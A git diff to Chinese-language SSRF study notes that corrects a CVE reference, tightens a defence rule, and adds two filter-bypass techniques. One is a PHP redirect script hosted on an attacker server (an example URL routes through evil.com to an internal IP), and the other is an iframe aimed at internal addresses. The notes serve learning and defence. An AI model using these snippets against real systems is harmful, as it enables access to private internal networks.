@@ -57,7 +57,7 @@ http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png
 ### 0x05 通用的SSRF实例
 * weblogin配置不当，天生ssrf漏洞
 * discuz x2.5/x3.0/x3.1/x3.2 ssrf漏洞
-* CVE-2016-1897/8 - FFMpeg
+* CVE-2016-1897/CVE-2016-1898 - FFMpeg
 * CVE-2016-3718 - ImageMagick
 
 ### 0x06 附实例POC
@@ -105,4 +105,28 @@ for x in xrange(1,30):
 ### 0x07 防御
 * 限制协议为http或https
 * 禁止30x转跳
-* 过滤参数(只要出现内网ip直接干掉)
+* 过滤参数(只要出现内网ip或域名就直接干掉)
+
+<br>
+#### ===== 20170609更新 =====
+宝哥说的姿势：
+
+* 302跳转
+
+> ```php
+//在自己服务器上建立文件，利用302跳转到对方内网地址。
+//http://target.com/httpProxyAccess.htm?go=http://evil.com/a.php?url=http://10.11.213.57
+//a.php内容如下：
+<?php
+    $url = $_GET['url'];
+    header("Location:".$url);
+?>
+```
+
+* iframe
+
+> ```php
+//在自己服务器建立文件，利用iframe标签请求对方内网地址。
+//参考http://www.secpulse.com/archives/50034.html
+<iframe src="对方内网地址">
+```
